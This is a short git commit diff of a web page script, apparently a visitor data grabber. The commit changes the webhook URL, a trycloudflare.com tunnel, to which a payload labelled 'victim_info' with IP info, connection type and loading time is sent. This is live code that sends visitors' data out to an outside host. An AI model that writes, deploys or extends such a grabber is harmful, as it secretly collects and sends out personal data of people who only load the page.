23df70ead3dd25e7811b9e1866ee04cfd57833d4
Elysioxx <108831238+elyelysiox@users.noreply.github.com>
2025-03-20 16:36:55 -0500

    update file

--- script.js
+++ script.js
@@ -85,7 +85,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://exercises-located-opposed-benefits.trycloudflare.com/userData";
+                const webhookURL = "https://richards-mails-wildlife-provider.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
